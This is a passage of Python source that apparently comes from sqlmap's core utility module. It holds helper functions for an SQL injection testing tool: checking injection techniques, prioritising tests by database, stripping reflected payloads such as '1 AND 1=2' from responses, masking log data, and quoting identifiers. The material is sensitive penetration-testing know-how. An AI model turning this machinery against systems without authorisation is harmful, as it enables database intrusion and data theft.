isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR)\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"\n\n    if conf.technique and isinstance(conf.technique, list) and technique not in conf.technique:\n        return False\n    else:\n        return getTechniqueData(technique) is not None\n\ndef isHeavyQueryBased(technique=None):\n    \"\"\"\n    Returns True whether current (kb.)technique is heavy-query based\n\n    >>> pushValue(kb.injection.data)\n    >>> setTechnique(PAYLOAD.TECHNIQUE.STACKED)\n    >>> kb.injection.data[getTechnique()] = [test for test in getSortedInjectionTests() if \"heavy\" in test[\"title\"].lower()][0]\n    >>> isHeavyQueryBased()\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"\n\n    retVal = False\n\n    technique = technique or getTechnique()\n\n    if isTechniqueAvailable(technique):\n        data = getTechniqueData(technique)\n        if data and \"heavy query\" in data[\"title\"].lower():\n            retVal = True\n\n    return retVal\n\ndef isStackingAvailable():\n    \"\"\"\n    Returns True whether techniques using stacking are available\n\n    >>> pushValue(kb.injection.data)\n    >>> kb.injection.data[PAYLOAD.TECHNIQUE.STACKED] = [test for test in getSortedInjectionTests() if \"stacked\" in test[\"title\"].lower()][0]\n    >>> isStackingAvailable()\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"\n\n    retVal = False\n\n    if PAYLOAD.TECHNIQUE.STACKED in kb.injection.data:\n        retVal = True\n    else:\n        for technique in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True):\n            data = getTechniqueData(technique)\n            if data and \"stacked\" in data[\"title\"].lower():\n                retVal = True\n                break\n\n    return retVal\n\ndef isInferenceAvailable():\n    \"\"\"\n    Returns True whether techniques using inference technique are available\n\n    >>> pushValue(kb.injection.data)\n    >>> kb.injection.data[PAYLOAD.TECHNIQUE.BOOLEAN] = getSortedInjectionTests()[0]\n    >>> isInferenceAvailable()\n    True\n    >>> kb.injection.data = popValue()\n    \"\"\"\n\n    return any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.STACKED, PAYLOAD.TECHNIQUE.TIME))\n\ndef setOptimize():\n    \"\"\"\n    Sets options turned on by switch '-o'\n    \"\"\"\n\n    # conf.predictOutput = True\n    conf.keepAlive = True\n    conf.threads = 3 if conf.threads < 3 and cmdLineOptions.threads is None else conf.threads\n    conf.nullConnection = not any((conf.data, conf.textOnly, conf.titles, conf.string, conf.notString, conf.regexp, conf.tor))\n\n    if not conf.nullConnection:\n        debugMsg = \"turning off switch '--null-connection' used indirectly by switch '-o'\"\n        logger.debug(debugMsg)\n\ndef saveConfig(conf, filename):\n    \"\"\"\n    Saves conf to configuration filename\n    \"\"\"\n\n    config = UnicodeRawConfigParser()\n    userOpts = {}\n\n    for family in optDict:\n        userOpts[family] = []\n\n    for option, value in conf.items():\n        for family, optionData in optDict.items():\n            if option in optionData:\n                userOpts[family].append((option, value, optionData[option]))\n\n    for family, optionData in userOpts.items():\n        config.add_section(family)\n\n        optionData.sort()\n\n        for option, value, datatype in optionData:\n            if datatype and isListLike(datatype):\n                datatype = datatype[0]\n\n            if option in IGNORE_SAVE_OPTIONS:\n                continue\n\n            if value is None:\n                if datatype == OPTION_TYPE.BOOLEAN:\n                    value = \"False\"\n                elif datatype in (OPTION_TYPE.INTEGER, OPTION_TYPE.FLOAT):\n                    if option in defaults:\n                        value = str(defaults[option])\n                    else:\n                        value = '0'\n                elif datatype == OPTION_TYPE.STRING:\n                    value = \"\"\n\n            if isinstance(value, six.string_types):\n                value = value.replace(\"\\n\", \"\\n \")\n\n            config.set(family, option, value)\n\n    with openFile(filename, \"wb\") as f:\n        try:\n            config.write(f)\n        except IOError as ex:\n            errMsg = \"something went wrong while trying \"\n            errMsg += \"to write to the configuration file '%s' ('%s')\" % (filename, getSafeExString(ex))\n            raise SqlmapSystemException(errMsg)\n\ndef initTechnique(technique=None):\n    \"\"\"\n    Prepares data for technique specified\n    \"\"\"\n\n    try:\n        data = getTechniqueData(technique)\n        resetCounter(technique)\n\n        if data:\n            kb.pageTemplate, kb.errorIsNone = getPageTemplate(data.templatePayload, kb.injection.place)\n            kb.matchRatio = data.matchRatio\n            kb.negativeLogic = (technique == PAYLOAD.TECHNIQUE.BOOLEAN) and (data.where == PAYLOAD.WHERE.NEGATIVE)\n\n            # Restoring stored conf options\n            for key, value in kb.injection.conf.items():\n                if value and (not hasattr(conf, key) or (hasattr(conf, key) and not getattr(conf, key))):\n                    setattr(conf, key, value)\n                    debugMsg = \"resuming configuration option '%s' (%s)\" % (key, (\"'%s'\" % value) if isinstance(value, six.string_types) else value)\n                    logger.debug(debugMsg)\n\n                    if value and key == \"optimize\":\n                        setOptimize()\n        else:\n            warnMsg = \"there is no injection data available for technique \"\n            warnMsg += \"'%s'\" % enumValueToNameLookup(PAYLOAD.TECHNIQUE, technique)\n            logger.warning(warnMsg)\n\n    except SqlmapDataException:\n        errMsg = \"missing data in old session file(s). \"\n        errMsg += \"Please use '--flush-session' to deal \"\n        errMsg += \"with this error\"\n        raise SqlmapNoneDataException(errMsg)\n\ndef arrayizeValue(value):\n    \"\"\"\n    Makes a list out of value if it is not already a list or tuple itself\n\n    >>> arrayizeValue('1')\n    ['1']\n    \"\"\"\n\n    if isinstance(value, _collections.KeysView):\n        value = [_ for _ in value]\n    elif not isListLike(value):\n        value = [value]\n\n    return value\n\ndef unArrayizeValue(value):\n    \"\"\"\n    Makes a value out of iterable if it is a list or tuple itself\n\n    >>> unArrayizeValue(['1'])\n    '1'\n    >>> unArrayizeValue('1')\n    '1'\n    >>> unArrayizeValue(['1', '2'])\n    '1'\n    >>> unArrayizeValue([['a', 'b'], 'c'])\n    'a'\n    >>> unArrayizeValue(_ for _ in xrange(10))\n    0\n    \"\"\"\n\n    if isListLike(value):\n        if not value:\n            value = None\n        elif len(value) == 1 and not isListLike(value[0]):\n            value = value[0]\n        else:\n            value = [_ for _ in flattenValue(value) if _ is not None]\n            value = value[0] if len(value) > 0 else None\n    elif inspect.isgenerator(value):\n        value = unArrayizeValue([_ for _ in value])\n\n    return value\n\ndef flattenValue(value):\n    \"\"\"\n    Returns an iterator representing flat representation of a given value\n\n    >>> [_ for _ in flattenValue([['1'], [['2'], '3']])]\n    ['1', '2', '3']\n    \"\"\"\n\n    for i in iter(value):\n        if isListLike(i):\n            for j in flattenValue(i):\n                yield j\n        else:\n            yield i\n\ndef joinValue(value, delimiter=','):\n    \"\"\"\n    Returns a value consisting of joined parts of a given value\n\n    >>> joinValue(['1', '2'])\n    '1,2'\n    >>> joinValue('1')\n    '1'\n    \"\"\"\n\n    if isListLike(value):\n        retVal = delimiter.join(value)\n    else:\n        retVal = value\n\n    return retVal\n\ndef isListLike(value):\n    \"\"\"\n    Returns True if the given value is a list-like instance\n\n    >>> isListLike([1, 2, 3])\n    True\n    >>> isListLike('2')\n    False\n    \"\"\"\n\n    return isinstance(value, (list, tuple, set, OrderedSet, BigArray))\n\ndef getSortedInjectionTests():\n    \"\"\"\n    Returns prioritized test list by eventually detected DBMS from error messages\n\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.SQLITE\n    >>> [test for test in getSortedInjectionTests() if hasattr(test, \"details\") and hasattr(test.details, \"dbms\")][0].details.dbms == kb.forcedDbms\n    True\n    >>> kb.forcedDbms = popValue()\n    \"\"\"\n\n    retVal = copy.deepcopy(conf.tests)\n\n    def priorityFunction(test):\n        retVal = SORT_ORDER.FIRST\n\n        if test.stype == PAYLOAD.TECHNIQUE.UNION:\n            retVal = SORT_ORDER.LAST\n\n        elif \"details\" in test and \"dbms\" in (test.details or {}):\n            if intersect(test.details.dbms, Backend.getIdentifiedDbms()):\n                retVal = SORT_ORDER.SECOND\n            else:\n                retVal = SORT_ORDER.THIRD\n\n        return retVal\n\n    if Backend.getIdentifiedDbms():\n        retVal = sorted(retVal, key=priorityFunction)\n\n    return retVal\n\ndef filterListValue(value, regex):\n    \"\"\"\n    Returns list with items that have parts satisfying given regular expression\n\n    >>> filterListValue(['users', 'admins', 'logs'], r'(users|admins)')\n    ['users', 'admins']\n    \"\"\"\n\n    if isinstance(value, list) and regex:\n        retVal = [_ for _ in value if re.search(regex, _, re.I)]\n    else:\n        retVal = value\n\n    return retVal\n\ndef showHttpErrorCodes():\n    \"\"\"\n    Shows all HTTP error codes raised till now\n    \"\"\"\n\n    if kb.httpErrorCodes:\n        warnMsg = \"HTTP error codes detected during run:\\n\"\n        warnMsg += \", \".join(\"%d (%s) - %d times\" % (code, _http_client.responses[code] if code in _http_client.responses else '?', count) for code, count in kb.httpErrorCodes.items())\n        logger.warning(warnMsg)\n        if any((str(_).startswith('4') or str(_).startswith('5')) and _ != _http_client.INTERNAL_SERVER_ERROR and _ != kb.originalCode for _ in kb.httpErrorCodes):\n            msg = \"too many 4xx and/or 5xx HTTP error codes \"\n            msg += \"could mean that some kind of protection is involved (e.g. WAF)\"\n            logger.debug(msg)\n\ndef openFile(filename, mode='r', encoding=UNICODE_ENCODING, errors=\"reversible\", buffering=1):  # \"buffering=1\" means line buffered (Reference: http://stackoverflow.com/a/3168436)\n    \"\"\"\n    Returns file handle of a given filename\n\n    >>> \"openFile\" in openFile(__file__).read()\n    True\n    >>> b\"openFile\" in openFile(__file__, \"rb\", None).read()\n    True\n    \"\"\"\n\n    # Reference: https://stackoverflow.com/a/37462452\n    if 'b' in mode:\n        buffering = 0\n\n    if filename == STDIN_PIPE_DASH:\n        if filename not in kb.cache.content:\n            kb.cache.content[filename] = sys.stdin.read()\n\n        return contextlib.closing(io.StringIO(readCachedFileContent(filename)))\n    else:\n        try:\n            return codecs.open(filename, mode, encoding, errors, buffering)\n        except IOError:\n            errMsg = \"there has been a file opening error for filename '%s'. \" % filename\n            errMsg += \"Please check %s permissions on a file \" % (\"write\" if mode and ('w' in mode or 'a' in mode or '+' in mode) else \"read\")\n            errMsg += \"and that it's not locked by another process\"\n            raise SqlmapSystemException(errMsg)\n\ndef decodeIntToUnicode(value):\n    \"\"\"\n    Decodes inferenced integer value to an unicode character\n\n    >>> decodeIntToUnicode(35) == '#'\n    True\n    >>> decodeIntToUnicode(64) == '@'\n    True\n    \"\"\"\n    retVal = value\n\n    if isinstance(value, int):\n        try:\n            if value > 255:\n                _ = \"%x\" % value\n\n                if len(_) % 2 == 1:\n                    _ = \"0%s\" % _\n\n                raw = decodeHex(_)\n\n                if Backend.isDbms(DBMS.MYSQL):\n                    # Reference: https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_ord\n                    # Note: https://github.com/sqlmapproject/sqlmap/issues/1531\n                    retVal = getUnicode(raw, conf.encoding or UNICODE_ENCODING)\n                elif Backend.isDbms(DBMS.MSSQL):\n                    # Reference: https://docs.microsoft.com/en-us/sql/relational-databases/collations/collation-and-unicode-support?view=sql-server-2017 and https://stackoverflow.com/a/14488478\n                    retVal = getUnicode(raw, \"UTF-16-BE\")\n                elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE):     # Note: cases with Unicode code points (e.g. http://www.postgresqltutorial.com/postgresql-ascii/)\n                    retVal = _unichr(value)\n                else:\n                    retVal = getUnicode(raw, conf.encoding)\n            else:\n                retVal = _unichr(value)\n        except:\n            retVal = INFERENCE_UNKNOWN_CHAR\n\n    return retVal\n\ndef getDaysFromLastUpdate():\n    \"\"\"\n    Get total number of days from last update\n\n    >>> getDaysFromLastUpdate() >= 0\n    True\n    \"\"\"\n\n    if not paths:\n        return\n\n    return int(time.time() - os.path.getmtime(paths.SQLMAP_SETTINGS_PATH)) // (3600 * 24)\n\ndef unhandledExceptionMessage():\n    \"\"\"\n    Returns detailed message about occurred unhandled exception\n\n    >>> all(_ in unhandledExceptionMessage() for _ in (\"unhandled exception occurred\", \"Operating system\", \"Command line\"))\n    True\n    \"\"\"\n\n    errMsg = \"unhandled exception occurred in %s. It is recommended to retry your \" % VERSION_STRING\n    errMsg += \"run with the latest development version from official GitHub \"\n    errMsg += \"repository at '%s'. If the exception persists, please open a new issue \" % GIT_PAGE\n    errMsg += \"at '%s' \" % ISSUES_PAGE\n    errMsg += \"with the following text and any other information required to \"\n    errMsg += \"reproduce the bug. Developers will try to reproduce the bug, fix it accordingly \"\n    errMsg += \"and get back to you\\n\"\n    errMsg += \"Running version: %s\\n\" % VERSION_STRING[VERSION_STRING.find('/') + 1:]\n    errMsg += \"Python version: %s\\n\" % PYVERSION\n    errMsg += \"Operating system: %s\\n\" % platform.platform()\n    errMsg += \"Command line: %s\\n\" % re.sub(r\".+?\\bsqlmap\\.py\\b\", \"sqlmap.py\", getUnicode(\" \".join(sys.argv), encoding=getattr(sys.stdin, \"encoding\", None)))\n    errMsg += \"Technique: %s\\n\" % (enumValueToNameLookup(PAYLOAD.TECHNIQUE, getTechnique()) if getTechnique() is not None else (\"DIRECT\" if conf.get(\"direct\") else None))\n    errMsg += \"Back-end DBMS:\"\n\n    if Backend.getDbms() is not None:\n        errMsg += \" %s (fingerprinted)\" % Backend.getDbms()\n\n    if Backend.getIdentifiedDbms() is not None and (Backend.getDbms() is None or Backend.getIdentifiedDbms() != Backend.getDbms()):\n        errMsg += \" %s (identified)\" % Backend.getIdentifiedDbms()\n\n    if not errMsg.endswith(')'):\n        errMsg += \" None\"\n\n    return errMsg\n\ndef getLatestRevision():\n    \"\"\"\n    Retrieves latest revision from the offical repository\n    \"\"\"\n\n    retVal = None\n    req = _urllib.request.Request(url=\"https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/lib/core/settings.py\", headers={HTTP_HEADER.USER_AGENT: fetchRandomAgent()})\n\n    try:\n        content = getUnicode(_urllib.request.urlopen(req).read())\n        retVal = extractRegexResult(r\"VERSION\\s*=\\s*[\\\"'](?P<result>[\\d.]+)\", content)\n    except:\n        pass\n\n    return retVal\n\ndef fetchRandomAgent():\n    \"\"\"\n    Returns random HTTP User-Agent header value\n\n    >>> '(' in fetchRandomAgent()\n    True\n    \"\"\"\n\n    if not kb.userAgents:\n        debugMsg = \"loading random HTTP User-Agent header(s) from \"\n        debugMsg += \"file '%s'\" % paths.USER_AGENTS\n        logger.debug(debugMsg)\n\n        try:\n            kb.userAgents = getFileItems(paths.USER_AGENTS)\n        except IOError:\n            errMsg = \"unable to read HTTP User-Agent header \"\n            errMsg += \"file '%s'\" % paths.USER_AGENTS\n            raise SqlmapSystemException(errMsg)\n\n    return random.sample(kb.userAgents, 1)[0]\n\ndef createGithubIssue(errMsg, excMsg):\n    \"\"\"\n    Automatically create a Github issue with unhandled exception information\n    \"\"\"\n\n    try:\n        issues = getFileItems(paths.GITHUB_HISTORY, unique=True)\n    except:\n        issues = []\n    finally:\n        issues = set(issues)\n\n    _ = re.sub(r\"'[^']+'\", \"''\", excMsg)\n    _ = re.sub(r\"\\s+line \\d+\", \"\", _)\n    _ = re.sub(r'File \".+?/(\\w+\\.py)', r\"\\g<1>\", _)\n    _ = re.sub(r\".+\\Z\", \"\", _)\n    _ = re.sub(r\"(Unicode[^:]*Error:).+\", r\"\\g<1>\", _)\n    _ = re.sub(r\"= _\", \"= \", _)\n\n    key = hashlib.md5(getBytes(_)).hexdigest()[:8]\n\n    if key in issues:\n        return\n\n    msg = \"\\ndo you want to automatically create a new (anonymized) issue \"\n    msg += \"with the unhandled exception information at \"\n    msg += \"the official Github repository? [y/N] \"\n    try:\n        choice = readInput(msg, default='N', checkBatch=False, boolean=True)\n    except:\n        choice = None\n\n    if choice:\n        _excMsg = None\n        errMsg = errMsg[errMsg.find(\"\\n\"):]\n\n        req = _urllib.request.Request(url=\"https://api.github.com/search/issues?q=%s\" % _urllib.parse.quote(\"repo:sqlmapproject/sqlmap Unhandled exception (#%s)\" % key), headers={HTTP_HEADER.USER_AGENT: fetchRandomAgent()})\n\n        try:\n            content = _urllib.request.urlopen(req).read()\n            _ = json.loads(content)\n            duplicate = _[\"total_count\"] > 0\n            closed = duplicate and _[\"items\"][0][\"state\"] == \"closed\"\n            if duplicate:\n                warnMsg = \"issue seems to be already reported\"\n                if closed:\n                    warnMsg += \" and resolved. Please update to the latest \"\n                    warnMsg += \"development version from official GitHub repository at '%s'\" % GIT_PAGE\n                logger.warning(warnMsg)\n                return\n        except:\n            pass\n\n        data = {\"title\": \"Unhandled exception (#%s)\" % key, \"body\": \"```%s\\n```\\n```\\n%s```\" % (errMsg, excMsg)}\n        req = _urllib.request.Request(url=\"https://api.github.com/repos/sqlmapproject/sqlmap/issues\", data=getBytes(json.dumps(data)), headers={HTTP_HEADER.AUTHORIZATION: \"token %s\" % decodeBase64(GITHUB_REPORT_OAUTH_TOKEN, binary=False), HTTP_HEADER.USER_AGENT: fetchRandomAgent()})\n\n        try:\n            content = getText(_urllib.request.urlopen(req).read())\n        except Exception as ex:\n            content = None\n            _excMsg = getSafeExString(ex)\n\n        issueUrl = re.search(r\"https://github.com/sqlmapproject/sqlmap/issues/\\d+\", content or \"\")\n        if issueUrl:\n            infoMsg = \"created Github issue can been found at the address '%s'\" % issueUrl.group(0)\n            logger.info(infoMsg)\n\n            try:\n                with openFile(paths.GITHUB_HISTORY, \"a+b\") as f:\n                    f.write(\"%s\\n\" % key)\n            except:\n                pass\n        else:\n            warnMsg = \"something went wrong while creating a Github issue\"\n            if _excMsg:\n                warnMsg += \" ('%s')\" % _excMsg\n            if \"Unauthorized\" in warnMsg:\n                warnMsg += \". Please update to the latest revision\"\n            logger.warning(warnMsg)\n\ndef maskSensitiveData(msg):\n    \"\"\"\n    Masks sensitive data in the supplied message\n\n    >>> maskSensitiveData('python sqlmap.py -u \"http://www.test.com/vuln.php?id=1\" --banner') == 'python sqlmap.py -u *********************************** --banner'\n    True\n    >>> maskSensitiveData('sqlmap.py -u test.com/index.go?id=index --auth-type=basic --auth-creds=foo:bar\\\\ndummy line') == 'sqlmap.py -u ************************** --auth-type=***** --auth-creds=*******\\\\ndummy line'\n    True\n    \"\"\"\n\n    retVal = getUnicode(msg)\n\n    for item in filterNone(conf.get(_) for _ in SENSITIVE_OPTIONS):\n        if isListLike(item):\n            item = listToStrValue(item)\n\n        regex = SENSITIVE_DATA_REGEX % re.sub(r\"(\\W)\", r\"\\\\\\1\", getUnicode(item))\n        while extractRegexResult(regex, retVal):\n            value = extractRegexResult(regex, retVal)\n            retVal = retVal.replace(value, '*' * len(value))\n\n    # Just in case (for problematic parameters regarding user encoding)\n    for match in re.finditer(r\"(?im)[ -]-(u|url|data|cookie|auth-\\w+|proxy|host|referer|headers?|H)( |=)(.*?)(?= -?-[a-z]|$)\", retVal):\n        retVal = retVal.replace(match.group(3), '*' * len(match.group(3)))\n\n    # Fail-safe substitutions\n    retVal = re.sub(r\"(?i)(Command line:.+)\\b(https?://[^ ]+)\", lambda match: \"%s%s\" % (match.group(1), '*' * len(match.group(2))), retVal)\n    retVal = re.sub(r\"(?i)(\\b\\w:[\\\\/]+Users[\\\\/]+|[\\\\/]+home[\\\\/]+)([^\\\\/]+)\", lambda match: \"%s%s\" % (match.group(1), '*' * len(match.group(2))), retVal)\n\n    if getpass.getuser():\n        retVal = re.sub(r\"(?i)\\b%s\\b\" % re.escape(getpass.getuser()), '*' * len(getpass.getuser()), retVal)\n\n    return retVal\n\ndef listToStrValue(value):\n    \"\"\"\n    Flattens list to a string value\n\n    >>> listToStrValue([1,2,3])\n    '1, 2, 3'\n    \"\"\"\n\n    if isinstance(value, (set, tuple, types.GeneratorType)):\n        value = list(value)\n\n    if isinstance(value, list):\n        retVal = value.__str__().lstrip('[').rstrip(']')\n    else:\n        retVal = value\n\n    return retVal\n\ndef intersect(containerA, containerB, lowerCase=False):\n    \"\"\"\n    Returns intersection of the container-ized values\n\n    >>> intersect([1, 2, 3], set([1,3]))\n    [1, 3]\n    \"\"\"\n\n    retVal = []\n\n    if containerA and containerB:\n        containerA = arrayizeValue(containerA)\n        containerB = arrayizeValue(containerB)\n\n        if lowerCase:\n            containerA = [val.lower() if hasattr(val, \"lower\") else val for val in containerA]\n            containerB = [val.lower() if hasattr(val, \"lower\") else val for val in containerB]\n\n        retVal = [val for val in containerA if val in containerB]\n\n    return retVal\n\ndef decodeStringEscape(value):\n    \"\"\"\n    Decodes escaped string values (e.g. \"\\\\t\" -> \"\\t\")\n    \"\"\"\n\n    retVal = value\n\n    if value and '\\\\' in value:\n        charset = \"\\\\%s\" % string.whitespace.replace(\" \", \"\")\n        for _ in charset:\n            retVal = retVal.replace(repr(_).strip(\"'\"), _)\n\n    return retVal\n\ndef encodeStringEscape(value):\n    \"\"\"\n    Encodes escaped string values (e.g. \"\\t\" -> \"\\\\t\")\n    \"\"\"\n\n    retVal = value\n\n    if value:\n        charset = \"\\\\%s\" % string.whitespace.replace(\" \", \"\")\n        for _ in charset:\n            retVal = retVal.replace(_, repr(_).strip(\"'\"))\n\n    return retVal\n\ndef removeReflectiveValues(content, payload, suppressWarning=False):\n    \"\"\"\n    Neutralizes reflective values in a given content based on a payload\n    (e.g. ..search.php?q=1 AND 1=2 --> \"...searching for <b>1%20AND%201%3D2</b>...\" --> \"...searching for <b>__REFLECTED_VALUE__</b>...\")\n    \"\"\"\n\n    retVal = content\n\n    try:\n        if all((content, payload)) and isinstance(content, six.text_type) and kb.reflectiveMechanism and not kb.heuristicMode:\n            def _(value):\n                while 2 * REFLECTED_REPLACEMENT_REGEX in value:\n                    value = value.replace(2 * REFLECTED_REPLACEMENT_REGEX, REFLECTED_REPLACEMENT_REGEX)\n                return value\n\n            payload = getUnicode(urldecode(payload.replace(PAYLOAD_DELIMITER, \"\"), convall=True))\n            regex = _(filterStringValue(payload, r\"[A-Za-z0-9]\", encodeStringEscape(REFLECTED_REPLACEMENT_REGEX)))\n\n            if regex != payload:\n                if all(part.lower() in content.lower() for part in filterNone(regex.split(REFLECTED_REPLACEMENT_REGEX))[1:]):  # fast optimization check\n                    parts = regex.split(REFLECTED_REPLACEMENT_REGEX)\n\n                    # Note: naive approach\n                    retVal = content.replace(payload, REFLECTED_VALUE_MARKER)\n                    retVal = retVal.replace(re.sub(r\"\\A\\w+\", \"\", payload), REFLECTED_VALUE_MARKER)\n\n                    if len(parts) > REFLECTED_MAX_REGEX_PARTS:  # preventing CPU hogs\n                        regex = _(\"%s%s%s\" % (REFLECTED_REPLACEMENT_REGEX.join(parts[:REFLECTED_MAX_REGEX_PARTS // 2]), REFLECTED_REPLACEMENT_REGEX, REFLECTED_REPLACEMENT_REGEX.join(parts[-REFLECTED_MAX_REGEX_PARTS // 2:])))\n\n                    parts = filterNone(regex.split(REFLECTED_REPLACEMENT_REGEX))\n\n                    if regex.startswith(REFLECTED_REPLACEMENT_REGEX):\n                        regex = r\"%s%s\" % (REFLECTED_BORDER_REGEX, regex[len(REFLECTED_REPLACEMENT_REGEX):])\n                    else:\n                        regex = r\"\\b%s\" % regex\n\n                    if regex.endswith(REFLECTED_REPLACEMENT_REGEX):\n                        regex = r\"%s%s\" % (regex[:-len(REFLECTED_REPLACEMENT_REGEX)], REFLECTED_BORDER_REGEX)\n                    else:\n                        regex = r\"%s\\b\" % regex\n\n                    _retVal = [retVal]\n\n                    def _thread(regex):\n                        try:\n                            _retVal[0] = re.sub(r\"(?i)%s\" % regex, REFLECTED_VALUE_MARKER, _retVal[0])\n\n                            if len(parts) > 2:\n                                regex = REFLECTED_REPLACEMENT_REGEX.join(parts[1:])\n                                _retVal[0] = re.sub(r\"(?i)\\b%s\\b\" % regex, REFLECTED_VALUE_MARKER, _retVal[0])\n                        except KeyboardInterrupt:\n                            raise\n                        except:\n                            pass\n\n                    thread = threading.Thread(target=_thread, args=(regex,))\n                    thread.daemon = True\n                    thread.start()\n                    thread.join(REFLECTED_REPLACEMENT_TIMEOUT)\n\n                    if thread.is_alive():\n                        kb.reflectiveMechanism = False\n                        retVal = content\n                        if not suppressWarning:\n                            debugMsg = \"turning off reflection removal mechanism (because of timeouts)\"\n                            logger.debug(debugMsg)\n                    else:\n                        retVal = _retVal[0]\n\n                if retVal != content:\n                    kb.reflectiveCounters[REFLECTIVE_COUNTER.HIT] += 1\n                    if not suppressWarning:\n                        warnMsg = \"reflective value(s) found and filtering out\"\n                        singleTimeWarnMessage(warnMsg)\n\n                    if re.search(r\"(?i)FRAME[^>]+src=[^>]*%s\" % REFLECTED_VALUE_MARKER, retVal):\n                        warnMsg = \"frames detected containing attacked parameter values. Please be sure to \"\n                        warnMsg += \"test those separately in case that attack on this page fails\"\n                        singleTimeWarnMessage(warnMsg)\n\n                elif not kb.testMode and not kb.reflectiveCounters[REFLECTIVE_COUNTER.HIT]:\n                    kb.reflectiveCounters[REFLECTIVE_COUNTER.MISS] += 1\n                    if kb.reflectiveCounters[REFLECTIVE_COUNTER.MISS] > REFLECTIVE_MISS_THRESHOLD:\n                        kb.reflectiveMechanism = False\n                        if not suppressWarning:\n                            debugMsg = \"turning off reflection removal mechanism (for optimization purposes)\"\n                            logger.debug(debugMsg)\n\n    except (MemoryError, SystemError):\n        kb.reflectiveMechanism = False\n        if not suppressWarning:\n            debugMsg = \"turning off reflection removal mechanism\"\n            logger.debug(debugMsg)\n\n    return retVal\n\ndef normalizeUnicode(value, charset=string.printable[:string.printable.find(' ') + 1]):\n    \"\"\"\n    Does an ASCII normalization of unicode strings\n\n    # Reference: http://www.peterbe.com/plog/unicode-to-ascii\n\n    >>> normalizeUnicode(u'\\\\u0161u\\\\u0107uraj') == u'sucuraj'\n    True\n    >>> normalizeUnicode(getUnicode(decodeHex(\"666f6f00626172\"))) == u'foobar'\n    True\n    \"\"\"\n\n    retVal = value\n\n    if isinstance(value, six.text_type):\n        retVal = unicodedata.normalize(\"NFKD\", value)\n        retVal = \"\".join(_ for _ in retVal if _ in charset)\n\n    return retVal\n\ndef safeSQLIdentificatorNaming(name, isTable=False):\n    \"\"\"\n    Returns a safe representation of SQL identificator name (internal data format)\n\n    # Reference: http://stackoverflow.com/questions/954884/what-special-characters-are-allowed-in-t-sql-column-retVal\n\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.MSSQL\n    >>> getText(safeSQLIdentificatorNaming(\"begin\"))\n    '[begin]'\n    >>> getText(safeSQLIdentificatorNaming(\"foobar\"))\n    'foobar'\n    >>> kb.forceDbms = popValue()\n    \"\"\"\n\n    retVal = name\n\n    if conf.unsafeNaming:\n        return retVal\n\n    if isinstance(name, six.string_types):\n        retVal = getUnicode(name)\n        _ = isTable and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE)\n\n        if _:\n            retVal = re.sub(r\"(?i)\\A\\[?%s\\]?\\.\" % DEFAULT_MSSQL_SCHEMA, \"%s.\" % DEFAULT_MSSQL_SCHEMA, retVal)\n\n        # Note: SQL 92 has restrictions for identifiers starting with underscore (e.g. http://www.frontbase.com/documentation/FBUsers_4.pdf)\n        if retVal.upper() in kb.keywords or (not isTable and (retVal or \" \")[0] == '_') or (retVal or \" \")[0].isdigit() or not re.match(r\"\\A[A-Za-z0-9_@%s\\$]+\\Z\" % ('.' if _ else \"\"), retVal):  # MsSQL is the only DBMS where we automatically prepend schema to table name (dot is normal)\n            if not conf.noEscape:\n                retVal = unsafeSQLIdentificatorNaming(retVal)\n\n                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ACCESS, DBMS.CUBRID, DBMS.SQLITE):  # Note: in SQLite double-quotes are treated as string if column/identifier is non-existent (e.g. SELECT \"foobar\" FROM users)\n                    retVal = \"`%s`\" % retVal\n                elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.DB2, DBMS.HSQLDB, DBMS.H2, DBMS.INFORMIX, DBMS.MONETDB, DBMS.VERTICA, DBMS.MCKOI, DBMS.PRESTO, DBMS.CRATEDB, DBMS.CACHE, DBMS.EXTREMEDB, DBMS.FRONTBASE, DBMS.RAIMA, DBMS.VIRTUOSO):\n                    retVal = \"\\\"%s\\\"\" % retVal\n                elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.ALTIBASE, DBMS.MIMERSQL):\n                    retVal = \"\\\"%s\\\"\" % retVal.upper()\n                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):\n                    if isTable:\n                        parts = retVal.split('.', 1)\n                        for i in xrange(len(parts)):\n                            if parts[i] and (re.search(r\"\\A\\d|[^\\w]\", parts[i], re.U) or parts[i].upper() in kb.keywords):\n                                parts[i] = \"[%s]\" % parts[i]\n                        retVal = '.'.join(parts)\n                    else:\n                        if re.search(r\"\\A\\d|[^\\w]\", retVal, re.U) or retVal.upper() in kb.keywords:\n                            retVal = \"[%s]\" % retVal\n\n        if _ and DEFAULT_MSSQL_SCHEMA not in retVal and '.' not in re.sub(r\"\\[[^]]+\\]\", \"\", retVal):\n            if (conf.db or \"\").lower() != \"information_schema\":     # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5192\n                retVal = \"%s.%s\" % (DEFAULT_MSSQL_SCHEMA, retVal)\n\n    return retVal\n\ndef unsafeSQLIdentificatorNaming(name):\n    \"\"\"\n    Extracts identificator's name from its safe SQL representation\n\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.MSSQL\n    >>> getText(unsafeSQLIdentificatorNaming(\"[begin]\"))\n    'begin'\n    >>> getText(unsafeSQLIdentificatorNaming(\"foobar\"))\n    'foobar'\n    >>> kb.forceDbms = popValue()\n    \"\"\"\n\n    retVal = name\n\n    if isinstance(name, six.string_types):\n        if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ACCESS, DBMS.CUBRID, DBMS.SQLITE):\n            retVal = name.replace(\"`\", \"\")\n        elif Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.DB2, DBMS.HSQLDB, DBMS.H2, DBMS.INFORMIX, DBMS.MONETDB, DBMS.VERTICA, 